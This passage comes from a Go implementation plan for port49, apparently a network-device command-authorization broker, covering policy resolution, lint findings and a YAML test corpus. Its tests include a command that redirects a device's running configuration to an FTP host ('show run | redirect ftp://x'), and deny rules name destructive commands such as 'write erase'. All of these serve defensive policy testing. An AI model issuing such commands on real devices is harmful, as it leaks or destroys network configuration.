		// role would widen every other role's allowlist to the default.
		if len(r.Permit) > 0 {
			list := r.Pipe
			if list == nil {
				list = DefaultPipe
			}
			for _, rule := range list {
				pipe[rule] = true
			}
		}
		for _, rule := range slices.Concat(r.Permit, r.Deny, r.Pipe) {
			terms, _ := engine.ParseRule(rule)
			for _, t := range terms {
				if t.Kind != engine.Class {
					continue
				}
				patterns, ok := dialect.EntityClasses[t.Text]
				if !ok {
					// A class the platform does not define would silently never
					// match — a deny that does nothing — so it is an error, and
					// at load, not at a mint (spec §4, §8).
					return engine.Blob{}, nil, fmt.Errorf("role %q names @%s, which %s does not define", name,
						t.Text, platformName(d.Platform))
				}
				b.Classes[t.Text] = patterns
			}
		}
	}
	for rule := range pipe {
		b.Pipe = append(b.Pipe, rule)
	}
	sort.Strings(b.Pipe)
	attrs, err := p.layerAttributes(c, d.Platform, dialect)
	if err != nil {
		return engine.Blob{}, nil, err
	}
	for _, a := range attrs {
		b.Attributes = append(b.Attributes, a.Attribute)
	}
	return b, attrs, nil
}

func platformName(name string) string {
	if name == "" {
		return "a device with no platform"
	}
	return name
}

// layerAttributes applies spec §6's layering, platform → role → grant, most
// specific winning on a duplicate attribute name and every override recorded.
// Within one layer, sources are taken in name order — roles by name, grants by
// scope — so which one wins cannot depend on a file's layout.
func (p *Policy) layerAttributes(c composition, platformName string, dialect platform.Dialect) ([]AttributeSource, error) {
	var out []AttributeSource
	index := map[string]int{}
	put := func(a, source string) {
		name := engine.AttributeName(a)
		if i, ok := index[name]; ok {
			prev := out[i]
			out[i] = AttributeSource{Attribute: a, Source: source,
				Shadows: append(prev.Shadows, prev.Attribute+" ("+prev.Source+")")}
			return
		}
		index[name] = len(out)
		out = append(out, AttributeSource{Attribute: a, Source: source})
	}
	if c.level != "" {
		attrs, rendered, ok := p.render(dialect, c.level)
		if !ok {
			return nil, fmt.Errorf("level %s has no rendering on %s and no parent that has one (spec §6)",
				c.level, platformName)
		}
		for _, a := range attrs {
			put(a, "platform "+platformName+", level "+rendered)
		}
	}
	for _, name := range c.roles {
		attrs := p.roles[name].Attributes
		for _, a := range slices.Concat(attrs["all"], attrs[platformName]) {
			put(a, "role "+name)
		}
	}
	for _, g := range c.grants {
		for _, a := range slices.Concat(g.Attributes["all"], g.Attributes[platformName]) {
			put(a, "grant "+g.Scope+" ["+strings.Join(g.Roles, " ")+"]")
		}
	}
	return out, nil
}

// render follows a level's parent chain to the first level the platform maps
// (spec §6, `parent:`), returning its attributes and which level rendered.
func (p *Policy) render(dialect platform.Dialect, level string) ([]string, string, bool) {
	for l := level; l != ""; l = p.parents[l] {
		if attrs, ok := dialect.Render(l); ok {
			return attrs, l, true
		}
	}
	return nil, "", false
}

// privLvl is render's twin for the priv-lvl number the ceiling needs.
func (p *Policy) privLvl(dialect platform.Dialect, level string) (uint8, bool) {
	for l := level; l != ""; l = p.parents[l] {
		if n, ok := dialect.PrivLvl(l); ok {
			return n, true
		}
	}
	return 0, false
}

// checkDevices runs every subject's composition on every device in the
// inventory and refuses the policy where one would not compile or would
// contradict itself: a class the platform does not define, a level it cannot
// render, a ceiling it cannot number, a landing level above the ceiling, and
// `enable: auto` where the enable exchange does not carry the principal
// (spec §4, §5.6, §6, §7). They are joint policy-and-inventory checks, so a
// policy that passes here never meets them at a mint. Plan 6 turns a failure
// into a quarantined device rather than a refused policy (spec §13,
// decision 20).
func (p *Policy) checkDevices() error {
	names := make([]string, 0, len(p.subs))
	for name := range p.subs {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		sub := p.subs[name]
		for _, d := range p.env.Devices {
			res, err := p.resolve(sub, d, time.Time{})
			if errors.Is(err, ErrNoGrants) {
				continue
			}
			if err != nil {
				return fmt.Errorf("subject %q on device %q: %w", name, d.Name, err)
			}
			dialect := p.dialect(d.Platform)
			if res.MaxPrivilege > 0 && res.Level != "" {
				if landing, ok := p.privLvl(dialect, res.Level); ok && landing > res.MaxPrivilege {
					return fmt.Errorf("subject %q on device %q: its roles land it at %s (priv-lvl %d), above its "+
						"grants' max_privilege %s (%d): the device would be told %d while port49 holds the session "+
						"at %d, and every command would be denied privilege_exceeded; raise max_privilege or lower "+
						"the role", name, d.Name, res.Level, landing, res.Ceiling, res.MaxPrivilege, landing, res.MaxPrivilege)
				}
			}
			if sub.Enable == "auto" {
				if eu := p.env.EnableUsernames[d.Platform]; eu != "" && eu != platform.EnablePrincipal {
					return fmt.Errorf("subject %q: enable: auto reaches device %q, whose platform %s does not put "+
						"the operator's own username on the enable exchange; use token or none (spec §5.6, "+
						"\"Why enable: auto is restricted\")", name, d.Name, d.Platform)
				}
			}
		}
	}
	return nil
}
```

<!-- patch: internal/policy/load.go -->
```diff
diff --git a/internal/policy/load.go b/internal/policy/load.go
index d8bb423..0aca89f 100644
--- a/internal/policy/load.go
+++ b/internal/policy/load.go
@@ -168,6 +168,9 @@ func Parse(raw []byte, env Env) (*Policy, error) {
 	if len(p.subs) == 0 {
 		return nil, errors.New("declares no subjects, so nobody can mint; is this the right file?")
 	}
+	if err := p.checkDevices(); err != nil {
+		return nil, err
+	}
 	return p, nil
 }
 
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/policy/ -count=1 && go vet ./internal/policy/`
Expected: PASS — Task 8's and Task 9's tests included: their policies pass the joint checks.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/resolve.go internal/policy/resolve_test.go internal/policy/load.go
git commit -m "feat: resolve a principal on a device and compile its blob

Spec §5.1 end to end: the grants whose scope selects the device, the
roles they and the device's scopes carry, the level and ceiling they
compose to, and a blob with the platform's classes and normalization
and the session attributes layered platform, role, grant, each
override recorded. Every subject is compiled on every device at load,
so a class a platform lacks, a level it cannot render, a ceiling below
the landing level, or enable: auto where the enable exchange carries no
principal refuses the policy before any mint meets it.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 11: Spec §11 as a test corpus, what CI reports, and the tests a policy carries

**Files:**
- Create: `internal/policy/lint.go`, `internal/policy/tests.go`
- Test: `internal/policy/lint_test.go`, `internal/policy/spec11_test.go`,
  `internal/policy/testdata/spec11.yaml`, `internal/policy/testdata/spec11-inventory.yaml`

**Interfaces:**
- Consumes: `Resolve`, `ResolveSubject` (Task 10); `engine.Encode`, `Decode`, `Compile`,
  `Program.Command` (Tasks 5, 6); `admission.LoadFile`.
- Produces:
  - `type Finding struct { Kind, Message string }` and the kinds `FindingAttachedPermit`,
    `FindingGrantlessSubject`, `FindingAPIRights`, `FindingGroupSubject`,
    `FindingMandatoryAttribute`, `FindingAttributeShadowed`, `FindingIncomparableVersion`;
    `func (*Policy) Lint() []Finding`.
  - `func CommandRaw(line string) []string`;
    `func (*Policy) Decide(subject, principal string, d admission.Device, line string, now time.Time) (Resolution, engine.Outcome, error)`
    — the blob a mint would write, encoded, decoded and compiled, then `Command`.
  - `func Caveats(platformName string, d platform.Dialect, o engine.Outcome) []string`.
  - `type TestResult struct { Test Test; Permit bool; Reason decision.Reason; Outcome engine.Outcome; Pass bool; Err error; Caveats []string }`;
    `func (*Policy) RunTests(now time.Time) []TestResult`.
  - `func (*Policy) Dialect(name string) platform.Dialect`; `func (*Policy) Device(name string) (admission.Device, bool)`.
  Task 15's `Explain` uses `Decide` and `Caveats`; Task 16's `policy test` prints `Lint` and
  `RunTests`.

The corpus is §11 with two blocks moved and one line added, each said in the file's header: its
`key_groups` go to the inventory file where they live until plan 6, `platform_set` is plan 5's, and
`svc_oxidized` declares the username spec §2 gives it (Decided 24; spec corrected in Task 1). Its
`operator` level is mapped to `priv-lvl=7` in a test-only dialect table, because the shipped
`arista_eos` adapter leaves it unmapped (Question 1). The order-independence test shuffles every
list of the file and requires byte-identical decisions (spec §14).

- [ ] **Step 1: Write the corpus and the failing tests**

<!-- write: internal/policy/testdata/spec11.yaml -->
```yaml
# Spec §11's complete policy example, as a test corpus (spec §14). Two blocks
# are not here, and one line is:
#
#   - `platform_set` is plan 5's and `key_groups` live in the inventory file
#     until plan 6 (spec11-inventory.yaml carries §11's two groups).
#   - svc_oxidized declares the username spec §2 gives it. A machine subject
#     with no username fails at load (spec §14, "Username resolution"), and
#     §11 as printed omits it; the spec is corrected in the same plan.

privilege_levels:
  - {name: readonly}
  - {name: read_only_limited, parent: readonly}
  - {name: operator}
  - {name: admin}

scopes:
  - {name: all_devices, match: {}}
  - {name: dc_fabric,   match: {site: [dc1, dc2], role: [leaf, spine]}}
  - name: srx_unpatched
    match: {platform: juniper_junos, os_version: {lt: "21.4R3-S5"}}
    on_missing: include
    security_log: true
    attached_roles:
      humans:   [cve_2026_xxxx]
      machines: [cve_2026_xxxx]

roles:
  - name: read_only
    privilege: readonly
    permit:
      - show **
      - terminal length *

  - name: read_only_limited
    privilege: read_only_limited
    permit:
      - show version
      - show interfaces **
      - show ip route **

  - name: network_admin
    privilege: admin
    permit: ["**"]
    pipe:
      permit: ["**"]

  - name: bgp_operator
    privilege: operator
    permit:
      - show bgp **
      - clear bgp /^[0-9]+$/ **
      - clear bgp neighbor **
    deny:
      - clear bgp all

  - name: interface_tech
    privilege: operator
    permit:
      - configure **
      - interface @physical
      - shutdown
      - no shutdown
      - description **
      - end
    deny:
      - interface @management

  - name: elevated_session
    privilege: admin
    reason: "device exposes show running-config only at level 15"

  - name: no_disruptive
    deny:
      - reload **
      - write erase **

  - name: cve_2026_xxxx
    reason: "CVE-2026-XXXX — SRX cluster subsystem"
    deny:
      - show chassis cluster **

  - name: cve_2026_xxxx_assess
    reason: "CVE-2026-XXXX — IR needs cluster state to assess exposure"
    permit:
      - show chassis cluster status

subjects:
  - {name: netops_admins, group: "CN=netops-admins,OU=Groups,DC=example,DC=com",
     enable: token, token_ttl: 60s}
  - {name: noc_tier1,     group: "CN=noc-tier1,OU=Groups,DC=example,DC=com",
     enable: none,  token_ttl: 60s}
  - {name: security_ir,   group: "CN=security-ir,OU=Groups,DC=example,DC=com",
     enable: token, token_ttl: 60s}
  - {name: svc_oxidized,  identity: "system:serviceaccount:netops:oxidized",
     username: svc-config-backup, enable: token, token_ttl: 900s}

grants:
  - {subject: netops_admins, scope: all_devices,   roles: [network_admin], max_privilege: admin}
  - {subject: noc_tier1,     scope: all_devices,   roles: [read_only, no_disruptive]}
  - {subject: noc_tier1,     scope: dc_fabric,     roles: [interface_tech], expires: 2026-12-01}
  - {subject: svc_oxidized,  scope: all_devices,   roles: [read_only, elevated_session]}
  - {subject: security_ir,   scope: srx_unpatched, roles: [cve_2026_xxxx_assess]}

tests:
  - {subject: noc_tier1,    device: leaf-01, command: "show version",   expect: permit}
  - {subject: noc_tier1,    device: leaf-01, command: "reload",         expect: deny}
  - {subject: noc_tier1,    device: leaf-01, command: "show run | redirect ftp://x",
     expect: deny}
  - {subject: svc_oxidized, device: leaf-01, command: "show running-config",
     expect: permit}
  - {subject: svc_oxidized, device: srx-fw-04, command: "show chassis hardware",
     expect: permit}      # the CVE deny is scoped to `cluster`, so no conflict arises
  - {subject: noc_tier1,    device: srx-fw-04, command: "show chassis cluster status",
     expect: deny}        # only the CVE deny matches
  - {subject: security_ir,  device: srx-fw-04, command: "show chassis cluster status",
     expect: permit}      # the assess permit dominates the CVE deny at every position
```

<!-- write: internal/policy/testdata/spec11-inventory.yaml -->
```yaml
# The inventory spec §11's example runs against (policy_test's corpus). Spec §11
# names leaf-01 and srx-fw-04; the rest are there to be outside a scope, or to
# make the srx_unpatched report say something. §11's two key groups are here
# because key groups live in the inventory file until plan 6.
devices:
  - {name: leaf-01,     platform: arista_eos,    addresses: [10.1.1.1], attributes: {site: dc1, role: leaf}}
  - {name: campus-sw-7, platform: arista_eos,    addresses: [10.1.2.7], attributes: {site: campus}}
  - {name: srx-fw-04,   platform: juniper_junos, addresses: [10.1.5.4], attributes: {site: edge, os_version: 21.4R3-S4}}
  - {name: srx-fw-05,   platform: juniper_junos, addresses: [10.1.5.5], attributes: {site: edge, os_version: 22.2R1}}
  - {name: srx-fw-22,   platform: juniper_junos, addresses: [10.1.5.22], attributes: {site: edge, os_version: 21.4X75-D40}}
key_groups:
  - {match: {cidr: 10.0.0.0/8},       key_ref: prod_key}
  - {match: {attributes: {env: lab}}, key_ref: lab_key}
```

<!-- write: internal/policy/spec11_test.go -->
```go
package policy

import (
	"encoding/json"
	"math/rand"
	"os"
	"reflect"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/platform"
)

// spec11Env is the corpus's environment: its own inventory file, and the
// built-in platforms with one line added. §11 lands bgp_operator and
// interface_tech at `operator`, and nothing measured says what `operator` is on
// vEOS, so the shipped arista_eos adapter leaves it unmapped and a real policy
// shaped like §11 is refused at load (plan 4, Question 1). The corpus is about
// decisions, not rendering, so it maps it here, to spec §8's example value.
func spec11Env(t *testing.T) Env {
	t.Helper()
	inv, err := admission.LoadFile("testdata/spec11-inventory.yaml")
	if err != nil {
		t.Fatal(err)
	}
	dialects := platform.Dialects()
	eos := dialects["arista_eos"]
	eos.Levels["operator"] = []string{"priv-lvl=7"}
	dialects["arista_eos"] = eos
	return Env{Devices: inv.Devices, Dialects: dialects}
}

func spec11(t *testing.T, raw []byte) *Policy {
	t.Helper()
	p, err := Parse(raw, spec11Env(t))
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func spec11Raw(t *testing.T) []byte {
	t.Helper()
	raw, err := os.ReadFile("testdata/spec11.yaml")
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

// Spec §11's own tests pass, on the day the corpus was written: its dc_fabric
// grant expires 2026-12-01.
func TestTheCompletePolicyExamplePassesItsOwnTests(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	results := p.RunTests(noon)
	if len(results) != 7 {
		t.Fatalf("%d results", len(results))
	}
	for _, r := range results {
		if !r.Pass {
			t.Errorf("%s on %s %q: got permit=%v %s (err %v), want %s", r.Test.Subject, r.Test.Device,
				r.Test.Command, r.Permit, r.Reason, r.Err, r.Test.Expect)
		}
	}
	// The pipeline test passes on port49's evaluation, and says the device
	// would never have sent the pipeline (tests/lab/results/L2-arista_eos.md).
	if c := results[2].Caveats; len(c) != 1 || !strings.Contains(c[0], "pipe_authorized: false") {
		t.Errorf("caveats on the redirect test: %q", c)
	}
	// And Junos never asks at all (decision 21).
	if c := results[4].Caveats; len(c) != 1 || !strings.Contains(c[0], "does not send per-command authorization") {
		t.Errorf("caveats on the SRX test: %q", c)
	}
}

// The three things spec §11 says it is chosen to show, as decisions.
func TestTheCompletePolicyExampleShowsWhatItSays(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	leaf, _ := p.Device("leaf-01")
	campus, _ := p.Device("campus-sw-7")
	srx, _ := p.Device("srx-fw-04")
	patched, _ := p.Device("srx-fw-05")
	for _, tt := range []struct {
		subject string
		device  admission.Device
		line    string
		permit  bool
		reason  decision.Reason
	}{
		// "interface @management carries all the platform-specific knowledge".
		{"noc_tier1", leaf, "interface Ethernet3", true, decision.PermitDominates},
		{"noc_tier1", leaf, "interface Management1", false, decision.NoRuleMatched},
		{"noc_tier1", campus, "interface Ethernet3", false, decision.NoRuleMatched}, // dc_fabric only
		{"noc_tier1", leaf, "clear counters", false, decision.NoRuleMatched},
		// svc_oxidized composes two roles: commands from one, level from the other.
		{"svc_oxidized", leaf, "configure terminal", false, decision.NoRuleMatched},
		// The mitigation lifts per device as it is remediated.
		{"noc_tier1", patched, "show chassis cluster status", true, decision.PermitDominates},
		{"noc_tier1", srx, "show chassis cluster", false, decision.NoPermitDominatesDeny},
		{"netops_admins", srx, "show chassis cluster status", false, decision.NoPermitDominatesDeny},
		{"netops_admins", leaf, "show run | redirect ftp://x", true, decision.PermitDominates},
		{"security_ir", leaf, "show version", false, decision.NoGrantsMatched},
	} {
		_, o, err := p.Decide(tt.subject, "", tt.device, tt.line, noon)
		if tt.reason == decision.NoGrantsMatched {
			if err != ErrNoGrants {
				t.Errorf("%s on %s: %v, want no grants", tt.subject, tt.device.Name, err)
			}
			continue
		}
		if err != nil || o.Permit != tt.permit || o.Reason != tt.reason {
			t.Errorf("%s on %s %q: permit=%v %s %v, want %v %s", tt.subject, tt.device.Name, tt.line,
				o.Permit, o.Reason, err, tt.permit, tt.reason)
		}
	}
	res, err := p.ResolveSubject("svc_oxidized", leaf, noon)
	if err != nil || res.Level != "admin" || res.Blob.Attributes[0] != "priv-lvl=15" {
		t.Fatalf("svc_oxidized lands at admin, from elevated_session: %+v %v", res, err)
	}
	limited, err := Parse([]byte(strings.Replace(string(spec11Raw(t)),
		"roles: [read_only, no_disruptive]}", "roles: [read_only_limited, no_disruptive]}", 1)), spec11Env(t))
	if err != nil {
		t.Fatal(err)
	}
	if r, _ := limited.ResolveSubject("noc_tier1", campus, noon); r.Blob.Attributes[0] != "priv-lvl=1" {
		t.Fatalf("read_only_limited renders as its parent readonly: %+v", r.Blob.Attributes)
	}
}

// What CI reports about §11: three group subjects nobody can mint for until
// plan 7, and the SRX whose version the comparator could not order, included
// in the mitigation and named (spec §5.5).
func TestTheCompletePolicyExampleReportsWhatItShould(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	var kinds []string
	var incomparable string
	for _, f := range p.Lint() {
		kinds = append(kinds, f.Kind)
		if f.Kind == FindingIncomparableVersion {
			incomparable = f.Message
		}
	}
	want := []string{FindingGroupSubject, FindingGroupSubject, FindingGroupSubject, FindingIncomparableVersion}
	if !reflect.DeepEqual(kinds, want) {
		t.Fatalf("findings %q, want %q", kinds, want)
	}
	if !strings.Contains(incomparable, "srx-fw-22") || !strings.Contains(incomparable, "os_version 21.4X75-D40 lt 21.4R3-S5") {
		t.Fatalf("the report names the device and the comparison: %s", incomparable)
	}
}

// Order independence (spec §5.4; §14): the same policy with its roles, scopes,
// subjects, grants and every rule list shuffled decides every test identically,
// down to which rule and role each decision names.
func TestShufflingThePolicyChangesNoDecision(t *testing.T) {
	raw := spec11Raw(t)
	want := decisions(t, spec11(t, raw))
	r := rand.New(rand.NewSource(49))
	for i := 0; i < 10; i++ {
		var doc yaml.Node
		if err := yaml.Unmarshal(raw, &doc); err != nil {
			t.Fatal(err)
		}
		shuffle(r, doc.Content[0])
		out, err := yaml.Marshal(&doc)
		if err != nil {
			t.Fatal(err)
		}
		if got := decisions(t, spec11(t, out)); !reflect.DeepEqual(got, want) {
			t.Fatalf("shuffle %d changed a decision:\n got %s\nwant %s\npolicy:\n%s", i, got, want, out)
		}
	}
}

// decisions renders every test's outcome as its record's policy block, with
// the bundle and blob hashes left out: those name the file's bytes, which a
// shuffle changes by design.
func decisions(t *testing.T, p *Policy) []string {
	t.Helper()
	var out []string
	for _, r := range p.RunTests(noon) {
		pol := r.Outcome.Policy("", "")
		b, err := json.Marshal(struct {
			Permit bool
			Reason decision.Reason
			Policy *decision.Policy
		}{r.Permit, r.Reason, pol})
		if err != nil {
			t.Fatal(err)
		}
		out = append(out, string(b))
	}
	return out
}

// shuffle permutes every sequence under the top-level keys that order must not
// matter for: the lists themselves and every list inside their entries.
func shuffle(r *rand.Rand, top *yaml.Node) {
	for i := 0; i+1 < len(top.Content); i += 2 {
		switch top.Content[i].Value {
		case "roles", "scopes", "subjects", "grants":
			shuffleDeep(r, top.Content[i+1])
		}
	}
}

func shuffleDeep(r *rand.Rand, n *yaml.Node) {
	if n.Kind == yaml.SequenceNode {
		r.Shuffle(len(n.Content), func(i, j int) { n.Content[i], n.Content[j] = n.Content[j], n.Content[i] })
	}
	for _, c := range n.Content {
		shuffleDeep(r, c)
	}
}
```

<!-- write: internal/policy/lint_test.go -->
```go
package policy

import (
	"strings"
	"testing"
)

// Every kind of finding, once: what CI reports about a policy that loads
// (spec §5.5, §6, §12; §14, "Attached roles").
func TestLintReportsWhatAReviewerMustSee(t *testing.T) {
	p := mustParse(t, `
scopes:
  - {name: all_devices, match: {}}
  - {name: baseline, match: {}, attached_roles: {humans: [look], machines: [deny_only]}, on_missing: include}
roles:
  - {name: look, permit: [show version]}
  - {name: deny_only, deny: [reload **]}
  - {name: ro, privilege: readonly, permit: [show **], attributes: {arista_eos: ["priv-lvl*2"], all: ["idletime=30"]}}
subjects:
  - {name: s, identity: "user:s@example.com", username: s, token_ttl: 60s, api: [revoke_others]}
  - {name: gone, identity: "user:gone@example.com", username: gone, token_ttl: 60s}
grants:
  - {subject: s, scope: all_devices, roles: [ro]}
`)
	got := map[string][]string{}
	for _, f := range p.Lint() {
		got[f.Kind] = append(got[f.Kind], f.Message)
	}
	for kind, want := range map[string]string{
		FindingAttachedPermit:     `scope "baseline" attaches role "look"`,
		FindingGrantlessSubject:   `subject "gone" has no grant`,
		FindingAPIRights:          `subject "s" holds api: [revoke_others]`,
		FindingMandatoryAttribute: `role "ro" sends idletime=30 mandatory`,
		FindingAttributeShadowed:  `priv-lvl*2 (role ro) shadows priv-lvl=1 (platform arista_eos, level readonly)`,
	} {
		if len(got[kind]) != 1 || !strings.Contains(got[kind][0], want) {
			t.Errorf("%s: %q, want one finding containing %q", kind, got[kind], want)
		}
	}
	if _, ok := got[FindingGroupSubject]; ok {
		t.Error("no group subject here")
	}
	// A deny-only attached role is routine and is not reported.
	for _, m := range got[FindingAttachedPermit] {
		if strings.Contains(m, "deny_only") {
			t.Errorf("a deny-only attached role was reported: %s", m)
		}
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ -count=1`
Expected: FAIL to build — `p.RunTests undefined`, `p.Lint undefined`, `p.Decide undefined`.

- [ ] **Step 3: Write the lint and the test runner**

<!-- write: internal/policy/lint.go -->
```go
package policy

import (
	"fmt"
	"slices"
	"sort"
	"strings"
	"time"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/engine"
)

// Finding is something CI reports about a policy that loads: not an error,
// but a fact a reviewer should see stated rather than discover (spec §5.5,
// §6, §12). `port49 policy test` prints them.
type Finding struct {
	Kind    string
	Message string
}

// The finding kinds.
const (
	FindingAttachedPermit      = "attached_permit"
	FindingGrantlessSubject    = "grantless_subject"
	FindingAPIRights           = "api_rights"
	FindingGroupSubject        = "group_subject"
	FindingMandatoryAttribute  = "mandatory_attribute"
	FindingAttributeShadowed   = "attribute_shadowed"
	FindingIncomparableVersion = "incomparable_version"
)

// Lint computes the findings, ordered by kind and then message so two runs
// over one policy print the same report.
func (p *Policy) Lint() []Finding {
	var out []Finding
	add := func(kind, format string, args ...any) {
		out = append(out, Finding{Kind: kind, Message: fmt.Sprintf(format, args...)})
	}
	for name, s := range p.scopes {
		for _, domain := range []string{"humans", "machines"} {
			for _, r := range s.Attached[domain] {
				if len(p.roles[r].Permit) > 0 {
					add(FindingAttachedPermit, "scope %q attaches role %q to every %s grant that reaches its "+
						"devices, and the role carries a permit (spec §5.5): a fleet-wide deny is routine, a "+
						"fleet-wide permit rarely is", name, r, strings.TrimSuffix(domain, "s"))
				}
			}
		}
	}
	for name, sub := range p.subs {
		if len(p.Grants(name)) == 0 {
			add(FindingGrantlessSubject, "subject %q has no grant and matches nothing; remove the block (spec §12)", name)
		}
		if len(sub.API) > 0 {
			add(FindingAPIRights, "subject %q holds api: [%s], authority over other people's sessions (spec §2)",
				name, strings.Join(sub.API, " "))
		}
		if sub.Group != "" {
			add(FindingGroupSubject, "subject %q is a group: the broker matches a principal to a group through the "+
				"directory, which is plan 7's, so until then it mints for no one; explain and policy tests "+
				"evaluate it by name", name)
		}
	}
	for name, r := range p.roles {
		for key, list := range r.Attributes {
			for _, a := range list {
				if engine.Mandatory(a) {
					add(FindingMandatoryAttribute, "role %q sends %s mandatory on %s: a device that cannot parse "+
						"it refuses the whole session (spec §6); write it with `*` unless the device needs `=`",
						name, a, key)
				}
			}
		}
	}
	for _, g := range p.grants {
		for key, list := range g.Attributes {
			for _, a := range list {
				if engine.Mandatory(a) {
					add(FindingMandatoryAttribute, "the grant of %s on %s sends %s mandatory on %s: a device that "+
						"cannot parse it refuses the whole session (spec §6)", g.Subject, g.Scope, a, key)
				}
			}
		}
	}
	seen := map[string]bool{}
	for name, sub := range p.subs {
		for _, d := range p.env.Devices {
			res, err := p.resolve(sub, d, time.Time{})
			if err != nil {
				continue
			}
			for _, a := range res.Attributes {
				for _, shadowed := range a.Shadows {
					msg := fmt.Sprintf("subject %q on %s: %s (%s) shadows %s", name, d.Platform, a.Attribute,
						a.Source, shadowed)
					if !seen[msg] {
						seen[msg] = true
						add(FindingAttributeShadowed, "%s", msg)
					}
				}
			}
		}
	}
	for name, s := range p.scopes {
		for _, d := range p.env.Devices {
			if ok, byIncomparable := s.selects(d); ok && byIncomparable {
				add(FindingIncomparableVersion, "scope %q includes %s because its version could not be compared "+
					"(%s); name the version explicitly, match it by regex, or exclude it by another attribute "+
					"(spec §5.5)", name, d.Name, s.comparedValues(d))
			}
		}
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Kind != out[j].Kind {
			return out[i].Kind < out[j].Kind
		}
		return out[i].Message < out[j].Message
	})
	return out
}

// comparedValues renders the device's values for every compared key against
// the bound, e.g. `os_version 21.4X75-D40 lt 21.4R3-S5`.
func (s *Scope) comparedValues(d admission.Device) string {
	var parts []string
	keys := make([]string, 0, len(s.Match))
	for k := range s.Match {
		keys = append(keys, k)
	}
	slices.Sort(keys)
	for _, k := range keys {
		ops := make([]string, 0, len(s.Match[k].Cmp))
		for op := range s.Match[k].Cmp {
			if op != "re" {
				ops = append(ops, op)
			}
		}
		slices.Sort(ops)
		for _, op := range ops {
			parts = append(parts, fmt.Sprintf("%s %s %s %s", k, d.Attributes[k], op, s.Match[k].Cmp[op]))
		}
	}
	return strings.Join(parts, "; ")
}
```

<!-- write: internal/policy/tests.go -->
```go
package policy

import (
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/platform"
)

// CommandRaw is the authorization request a device sends for a typed command
// line: `service=shell`, the first word as `cmd`, the rest as `cmd-arg`, the
// words kept exactly as typed.
func CommandRaw(line string) []string {
	f := strings.Fields(line)
	if len(f) == 0 {
		return []string{"service=shell"}
	}
	raw := []string{"service=shell", "cmd=" + f[0]}
	for _, a := range f[1:] {
		raw = append(raw, "cmd-arg="+a)
	}
	return raw
}

// Decide resolves a subject (or, with principal set, a principal) on a device
// and decides one command line with the very blob a mint would write: encoded,
// decoded and compiled, the path the daemon takes. It is what `port49
// explain` and `port49 policy test` both run.
func (p *Policy) Decide(subject, principal string, d admission.Device, line string, now time.Time) (Resolution, engine.Outcome, error) {
	var res Resolution
	var err error
	if principal != "" {
		res, err = p.Resolve(principal, d, now)
	} else {
		res, err = p.ResolveSubject(subject, d, now)
	}
	if err != nil {
		return res, engine.Outcome{}, err
	}
	body, hash, err := engine.Encode(res.Blob)
	if err != nil {
		return res, engine.Outcome{}, err
	}
	b, err := engine.Decode(hash, body)
	if err != nil {
		return res, engine.Outcome{}, err
	}
	prog, err := engine.Compile(b)
	if err != nil {
		return res, engine.Outcome{}, err
	}
	return res, prog.Command(CommandRaw(line)), nil
}

// Caveats are what port49's answer does not promise on this platform (spec
// §4, "Platform caveat"; §5.6, "Where these controls do not reach"; §12):
// explain and the policy tests must say so rather than report a decision the
// device will not honor.
func Caveats(platformName string, dialect platform.Dialect, o engine.Outcome) []string {
	var out []string
	if !dialect.Authorizes("commands") {
		out = append(out, fmt.Sprintf("%s does not send per-command authorization (supports: %s): the device "+
			"never asks port49 about this command, and a revocation or a session ceiling does not reach a live "+
			"session there (spec §5.6)", platformName, strings.Join(dialect.Supports, ", ")))
	}
	if len(o.Pipeline) > 0 && !dialect.PipeAuthorized {
		out = append(out, fmt.Sprintf("%s applies output modifiers itself after port49 authorizes the bare "+
			"command (pipe_authorized: false; tests/lab/results/L2-*.md), so the device never sends this "+
			"pipeline and no pipe rule protects it; the control is on the device", platformName))
	}
	return out
}

// TestResult is one `tests:` entry's run.
type TestResult struct {
	Test    Test
	Permit  bool
	Reason  decision.Reason
	Outcome engine.Outcome
	Pass    bool
	Err     error
	Caveats []string
}

// RunTests runs the file's tests against its inventory at now (spec §11,
// §12). A principal with no grant on the device is a deny, no_grants_matched,
// which is what the mint would answer.
func (p *Policy) RunTests(now time.Time) []TestResult {
	var out []TestResult
	for _, t := range p.tests {
		r := TestResult{Test: t}
		d, _ := p.device(t.Device)
		_, o, err := p.Decide(t.Subject, t.Principal, d, t.Command, now)
		switch {
		case errors.Is(err, ErrNoGrants):
			r.Reason = decision.NoGrantsMatched
		case err != nil:
			r.Err = err
		default:
			r.Permit, r.Reason, r.Outcome = o.Permit, o.Reason, o
			r.Caveats = Caveats(d.Platform, p.dialect(d.Platform), o)
		}
		verdict := "deny"
		if r.Permit {
			verdict = "permit"
		}
		r.Pass = r.Err == nil && verdict == t.Expect && (t.Reason == "" || decision.Reason(t.Reason) == r.Reason)
		out = append(out, r)
	}
	return out
}

// Dialect is the platform's dialect under this policy's environment.
func (p *Policy) Dialect(platformName string) platform.Dialect { return p.dialect(platformName) }

// Device looks a device up in the inventory the policy was loaded against.
func (p *Policy) Device(name string) (admission.Device, bool) { return p.device(name) }
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/policy/ -count=1 && go vet ./internal/policy/`
Expected: PASS: §11's seven tests pass, its three claims hold as decisions, shuffling it ten ways
changes nothing, and each finding kind is reported once.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/lint.go internal/policy/tests.go internal/policy/lint_test.go \
  internal/policy/spec11_test.go internal/policy/testdata/
git commit -m "test: spec §11 as a corpus, and what CI reports

